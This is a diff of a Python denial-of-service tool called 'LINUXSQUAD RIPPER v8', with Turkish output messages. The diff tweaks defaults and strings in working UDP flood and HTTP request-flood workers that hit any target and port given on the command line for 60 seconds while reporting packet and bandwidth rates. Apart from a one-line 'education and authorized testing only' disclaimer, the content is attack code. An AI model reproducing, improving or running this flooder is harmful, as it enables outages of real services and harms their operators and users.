@@ -19,8 +19,8 @@ import aiohttp
 os.system("clear")
 print("\033[92m")
 print("╔══════════════════════════════════════════════════════════════════════════════╗")
-print("║                    LINUXSQUAD RIPPER v8 - TERMUX FIXED v3                   ║")
-print("║                  Daha Güçlü + 60 Saniye Otomatik                             ║")
+print("║                    LINUXSQUAD RIPPER v8 - TERMUX FIXED v4                   ║")
+print("║                   +                                                         ║")
 print("╚══════════════════════════════════════════════════════════════════════════════╝")
 print("\033[0m")
 
@@ -30,15 +30,15 @@ print("\033[91m[!] SADECE EĞİTİM VE İZİNLİ TEST ORTAMINDA KULLANINIZ.\033[
 if len(sys.argv) < 3:
     print("\033[96mKullanım:\033[0m")
     print(f"   python {os.path.basename(sys.argv[0])} <HEDEF> <PORT> [CONCURRENCY] [METHOD]")
-    print("\n   Örnek  : python ripper.py 127.0.0.1 80 400 mixed")
+    print("   Örnek : python ripper.py 127.0.0.1 80 300 mixed")
     sys.exit(1)
 
 target = sys.argv[1]
 port = int(sys.argv[2])
-concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 350
+concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 300
 method = sys.argv[4].lower() if len(sys.argv) > 4 else "mixed"
 
-DURATION = 60  # ← Her seferinde otomatik 60 saniye
+DURATION = 60   # Her seferinde 60 saniye
 
 # ===================== İSTATİSTİK =====================
 stats = {"udp_packets": 0, "udp_bytes": 0, "http_requests": 0, "errors": 0, "start_time": time.time()}
@@ -62,17 +62,17 @@ def print_stats():
         print(f"\033[94m[STATS] UDP PPS: {pps:,.0f} | Bandwidth: {mbps:.2f} Mbps | "
               f"HTTP RPS: {rps:,.0f} | Errors: {stats['errors']}\033[0m", end="\r")
 
-# ===================== UDP FLOOD (Daha Güçlü) =====================
+# ===================== UDP FLOOD =====================
 def udp_flood_worker():
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)  # 64MB
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
     except:
         return
     while True:
         try:
             tport = port if random.random() > 0.2 else random.randint(1, 65535)
-            size = random.randint(8192, 32768)        # Daha büyük paketler
+            size = random.randint(8192, 32768)
             payload = random.randbytes(size)
             sock.sendto(payload, (target, tport))
             update_stats(udp_pkt=1, udp_bytes=size)
@@ -82,16 +82,12 @@ def udp_flood_worker():
 # ===================== HTTP FLOOD =====================
 USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]
 REFERERS = ["https://www.google.com/"]
-PATHS = ["/", "/index", "/home", "/search", "/api"]
+PATHS = ["/", "/index", "/home", "/search"]
 
 async def http_flood_worker(session):
     while True:
         try:
-            headers = {
-                "User-Agent": random.choice(USER_AGENTS),
-                "Referer": random.choice(REFERERS),
-                "Cache-Control": "no-cache"
-            }
+            headers = {"User-Agent": random.choice(USER_AGENTS), "Referer": random.choice(REFERERS)}
             path = random.choice(PATHS) + f"?t={int(time.time()*1000000)}"
             url = f"http://{target}:{port}{path}" if port not in (80, 443) else f"http://{target}{path}"
 
@@ -102,14 +98,12 @@ async def http_flood_worker(session):
             update_stats(err=1)
 
 # ===================== ANA PROGRAM =====================
-print(f"\033[91m[+] Hedef → {target}:{port} | Concurrency → {concurrency} | Method → {method.upper()} | Süre → {DURATION} saniye\033[0m")
+print(f"\033[91m[+] Hedef → {target}:{port} | Concurrency → {concurrency} | Method → {method.upper()} | Süre → {DURATION} sn\033[0m")
 
 if UVLOOP_ENABLED:
     print("\033[92m[+] uvloop aktif\033[0m")
 
 threading.Thread(target=print_stats, daemon=True).start()
-
-start_time = time.time()
 
 # UDP
 if method in ["udp", "mixed"]:
@@ -132,11 +126,9 @@ if method in ["http", "mixed"]:
 
     asyncio.run(run_http())
 
-# 60 saniye sonra otomatik durdur
-print(f"\033[93m[+] Saldırı {DURATION} saniye boyunca devam ediyor...\033[0m")
+print(f"\033[93m[+] {DURATION} saniye boyunca saldırı devam ediyor...\033[0m")
 time.sleep(DURATION)
 
-print("\n\033[91m[-] Süre doldu, saldırı durduruluyor...\033[0m")
-
-elapsed = time.time() - start_time
-print(f"\033[92m[+] Test tamamlandı. Toplam süre: {elapsed:.1f} saniye\033[0m")
+print("\n\033[91m[-] Süre doldu, saldırı durduruldu.\033[0m")
+elapsed = time.time() - stats["start_time"]
+print(f"\033[92m[+] Toplam süre: {elapsed:.1f} saniye\033[0m")
